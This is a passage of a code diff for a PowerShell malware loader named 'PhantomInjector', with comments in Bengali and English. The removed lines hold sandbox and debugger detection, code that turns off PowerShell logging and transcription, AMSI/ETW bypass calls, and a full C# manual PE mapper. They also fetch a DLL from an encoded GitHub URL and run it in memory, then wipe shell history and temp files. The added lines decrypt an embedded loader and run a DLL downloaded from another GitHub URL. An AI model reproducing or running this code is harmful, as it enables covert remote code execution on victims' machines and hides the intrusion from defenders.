-            $debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
-            $sandboxPaths = @("C:\sample.exe", "C:\malware.exe", "C:\analysis\")
-            foreach ($path in $sandboxPaths) {
-                if (Test-Path $path) {
-                    throw "Sandbox detected: $path"
-                }
-            }
-            return $true
-        }
-        catch {
-            # Silent fail, exit if debugger
-            exit
-        }
-    }
-
-    # --- NEW: Disable ScriptBlock Logging (Event 4104) ---
-    function Disable-ScriptBlockLogging {
-        try {
-            $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
-            if (Test-Path $regPath) {
-                Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
-            } else {
-                New-Item -Path $regPath -Force | Out-Null
-                New-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -PropertyType DWord -Force | Out-Null
-            }
-            $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
-            $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-            if ($gpoField) {
-                $gpo = $gpoField.GetValue($null)
-                if ($gpo -is [Hashtable]) {
-                    $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
-                } else {
-                    $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
-                    $gpoField.SetValue($null, $gpo)
-                }
-            }
-        } catch { }
-    }
-
-    # --- NEW: Disable Transcription ---
-    function Disable-Transcription {
-        try {
-            $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
-            if (Test-Path $regPath) {
-                Set-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
-            } else {
-                New-Item -Path $regPath -Force | Out-Null
-                New-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -PropertyType DWord -Force | Out-Null
-            }
-        } catch { }
-    }
-
-    # --- NEW: Hide Console Window (already done, but keep function for completeness) ---
-    function Hide-ConsoleWindow {
-        # Already done at top
-    }
-
-    # Execute ALL initialization routines (bypasses active globally)
-    Disable-ScriptBlockLogging
-    Disable-Transcription
-    Enable-SeDebugPrivilege
-    Test-Debugger
-    Invoke-AMSIBypass
-    Invoke-ETWBypass
-    Invoke-NTDLLUnhook
-}
-#endregion
-
-#region Original Injection Methods (KEPT for line count, but NOT used)
-function Invoke-APCInjection {
-    param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId)
-    return $false
-}
-function Invoke-ModuleStompingInjection {
-    param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId,[int]$TimeoutMS=2000)
-    return $false
-}
-function Invoke-ThreadHijack {
-    param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId,[int]$TimeoutMS=20000)
-    return $false
-}
-function Invoke-ProcessGhostingInjection {
-    param([switch]$UseGhosting,[switch]$DebugMode,[Parameter(Mandatory=$true)][byte[]]$Shellcode)
-    return $false
-}
-function Invoke-RemoteThreadInjection {
-    param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId)
-    return $false
-}
-#endregion
-
-#region NEW: Memory-Only DLL Injection (Active method with ENCRYPTED URL)
-function Invoke-MemoryOnlyDllInjection {
+# --------------------------------------------------------------------
+# ২) ডিক্রিপশন ফাংশন
+# --------------------------------------------------------------------
+function Get-DecryptedKernel {
     param(
-        [string]$EncodedDllUrl,
-        [int]$KeepAliveHours = 24
+        [string]$encB64,
+        [string]$keyB64,
+        [string]$ivB64
     )
+    $encBytes = [Convert]::FromBase64String($encB64)
+    $key      = [Convert]::FromBase64String($keyB64)
+    $iv       = [Convert]::FromBase64String($ivB64)
 
-    # --- Step 1: C# NativeLoader (Manual PE Mapping) ---
-    $kernel = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public class ManualMapResult { public IntPtr ImageBase; public uint ImageSize; public IntPtr DllMainAddr; public long Delta; public bool Is64Bit; }
-public static class NativeLoader {
-    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
-    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
-    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string n);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr LoadLibraryA(string n);
-    [DllImport("kernel32.dll")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
-    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
-    const uint MC = 0x1000, MR = 0x2000, MF = 0x8000, PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
-    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
-    static uint U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
-    static ulong U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
-    static uint RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
-    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
-    static ulong RU64(IntPtr p, long o) { long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4)); return (ulong)((hi<<32)|lo); }
-    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
-    static void WU32(IntPtr p, long o, uint v) { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
-    static string RAscii(IntPtr p, long o) { var sb = new StringBuilder(); for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); } return sb.ToString(); }
-    static uint SProt(uint c) { bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0; if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO; }
-    struct Sec { public uint VS,VA,SRD,PRD,Ch; }
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
-    public static ManualMapResult Map(byte[] dll, bool callEntry) {
-        var res = new ManualMapResult();
-        if(U16(dll,0)!=0x5A4D) throw new Exception("Invalid MZ");
-        int lfa = BitConverter.ToInt32(dll,0x3C); if(U32(dll,lfa)!=0x4550u) throw new Exception("Invalid PE");
-        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16); int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
-        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60); ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28); res.ImageSize=soi;
-        int dd=is64?oo+112:oo+96; uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);
-        int st=oo+ohs; var secs=new Sec[ns]; for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}
-        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW); if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
-        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;
-        Marshal.Copy(dll,0,img,(int)soh);
-        foreach(var s in secs){ if(s.SRD==0) continue; uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS); if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;} Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs); }
-        if(rrva!=0&&delta!=0){ uint ro=rrva, re=rrva+rsz; while(ro<re){ uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break; int ne=(int)(bs-8)/2; for(int i=0;i<ne;i++){ ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF; if(ty==0)continue; long tr=pg+of; if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));} else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));} } ro+=bs; } }
-        if(irva!=0){ int ie=0; while(true){ long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo); if(nr==0)break; string dn=RAscii(img,nr); IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn); if(hd==IntPtr.Zero){ie++;continue;} long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4; while(true){ long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te); if(tv==0)break; long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000; IntPtr fa=IntPtr.Zero; if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF)); else fa=GetProcAddress(hd,RAscii(img,tv+2)); if(fa!=IntPtr.Zero){ IntPtr ia=(IntPtr)(ab+ir+to); if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32()); } to+=ts; } ie++; } }
-        foreach(var s in secs){ uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op; VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op); }
-        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
-        res.DllMainAddr=IntPtr.Zero; if(callEntry&&ep!=0){ res.DllMainAddr=(IntPtr)(ab+ep); try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);} catch{} }
-        return res;
-    }
-    public static bool Free(IntPtr b) { return VirtualFree(b,UIntPtr.Zero,MF); }
-}
-'@
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $aes.IV  = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
-    try {
-        Add-Type -TypeDefinition $kernel -ErrorAction Stop
-    } catch {
-        return $false
-    }
-
-    # --- Step 2: DECODE the Base64 URL, then Download DLL (memory only) ---
-    try {
-        $decodedUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedDllUrl))
-        $bytes = (New-Object System.Net.WebClient).DownloadData($decodedUrl)
-    } catch {
-        return $false
-    }
-
-    # --- Step 3: Map DLL into memory (no disk) ---
-    try {
-        $result = [NativeLoader]::Map($bytes, $true)
-        Write-Host "[+] DLL mapped successfully at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
-    } catch {
-        return $false
-    }
-
-    # --- Step 4: Cleanup traces (memory) ---
-    $bytes = $null
-    $kernel = $null
-    $decodedUrl = $null
-    [GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-    # --- Step 5: Keep-alive loop ---
-    if ($KeepAliveHours -gt 0) {
-        $seconds = $KeepAliveHours * 3600
-        Start-Sleep -Seconds $seconds
-    }
-
-    return $true
-}
-#endregion
-
-#region Main Execution
-function Invoke-PhantomInjector {
-    [CmdletBinding(DefaultParameterSetName='Remote')]
-    param(
-        [Parameter(Mandatory=$false, ParameterSetName='Remote')]
-        [string]$EncodedDllUrl,  # ডিফল্ট মান param() থেকে আসবে
-
-        [Parameter(Mandatory=$false, ParameterSetName='Local')]
-        [string]$DllPath,
-
-        [switch]$UnhookNTDLL,
-        [switch]$BypassAMSI,
-        [switch]$BypassETW,
-        [int]$KeepAliveHours = 24
-    )
-
-    # Set script-level variables for bypass functions
-    $script:BypassAMSI = $BypassAMSI
-    $script:BypassETW = $BypassETW
-    $script:UnhookNTDLL = $UnhookNTDLL
-
-    # Initialize ALL evasions (called BEFORE anything else)
-    Invoke-Initialization
-
-    # Determine DLL source
-    try {
-        if ($PSCmdlet.ParameterSetName -eq 'Remote') {
-            if (-not $EncodedDllUrl) {
-                # Use the default from param() if not provided
-                $EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
-            }
-            Write-Verbose "[*] Using Base64-encoded remote URL"
-            $success = Invoke-MemoryOnlyDllInjection -EncodedDllUrl $EncodedDllUrl -KeepAliveHours $KeepAliveHours
-        } else {
-            Write-Verbose "[*] Reading local DLL: $DllPath"
-            $pathBytes = [System.Text.Encoding]::UTF8.GetBytes("file://$DllPath")
-            $encoded = [System.Convert]::ToBase64String($pathBytes)
-            $success = Invoke-MemoryOnlyDllInjection -EncodedDllUrl $encoded -KeepAliveHours $KeepAliveHours
-        }
-    } catch {
-        Write-Error "[-] Failed to load DLL: $_"
-        return
-    }
-
-    if ($success) {
-        Write-Host "[+] Injection successful!" -ForegroundColor Green
-    } else {
-        Write-Warning "[-] Injection failed"
-    }
-
-
-# ============================================================
-#  ★★★ ৬. ইতিহাস ও টেম্প ফাইল ক্লিয়ার ★★★
-# ============================================================
-Clear-History -Force
-$hp = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $hp) {
-    try {
-        # ফাইলটি খোলা থাকলে রিলিজ করার চেষ্টা
-        [System.GC]::Collect()
-        [System.GC]::WaitForPendingFinalizers()
-        Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue
-        # ফাইলটি খালি কন্টেন্ট দিয়ে ওভাররাইট
-        Set-Content -Path $hp -Value $null -Force -ErrorAction SilentlyContinue
-    } catch {}
+    $decryptor = $aes.CreateDecryptor()
+    $plainBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
 }
 
-# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+# --------------------------------------------------------------------
+# ৩) ডিক্রিপ্ট করে কম্পাইল করো
+# --------------------------------------------------------------------
+$kernel = Get-DecryptedKernel -encB64 $encryptedBase64 -keyB64 $keyBase64 -ivB64 $ivBase64
 
-# ভেরিয়েবল ক্লিয়ার
-$bytes = $null; $kernel = $null; $type = $null
-[GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-# ============================================================
-#  ★★★ ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
-# ============================================================
-
-    # Cleanup traces after injection
-    Clear-History
-    $hp = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
-
-    Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-
-    $bytes = $null; $kernel = $null; $type = $null
-    [GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-    # Keep-alive loop (infinite)
-    while ($true) { Start-Sleep -Seconds 86400 }
+try {
+    $null = Add-Type -TypeDefinition $kernel -ErrorAction Stop
+} catch {
+    Write-Error "ডিক্রিপশন বা কম্পাইলে সমস্যা। Base64 গুলো ঠিক আছে কিনা চেক করো।"
+    Invoke-Finalize
+    return
 }
 
+# --------------------------------------------------------------------
+# ৪) DLL ডাউনলোড ও ম্যানুয়াল ম্যাপ
+# --------------------------------------------------------------------
+$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/rsindian511-star/69s/raw/refs/heads/main/PlayBoyCorp.RuntimeLdr.dll")
+[NativeLoader]::Map($bytes, $true)
 
-# ============================================================
-#  ★★★ ৬. ইতিহাস ও টেম্প ফাইল ক্লিয়ার ★★★
-# ============================================================
-Clear-History -Force
-$hp = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $hp) {
-    try {
-        # ফাইলটি খোলা থাকলে রিলিজ করার চেষ্টা
-        [System.GC]::Collect()
-        [System.GC]::WaitForPendingFinalizers()
-        Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue
-        # ফাইলটি খালি কন্টেন্ট দিয়ে ওভাররাইট
-        Set-Content -Path $hp -Value $null -Force -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-
-# ভেরিয়েবল ক্লিয়ার
-$bytes = $null; $kernel = $null; $type = $null
-[GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-# ============================================================
-#  ★★★ ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
-# ============================================================
-
-# If parameters are provided, run the injection
-if ($PSBoundParameters.Count -gt 0 -or $EncodedDllUrl -or $DllPath) {
-    Invoke-PhantomInjector @PSBoundParameters
-}
-#endregion
+Invoke-Finalize
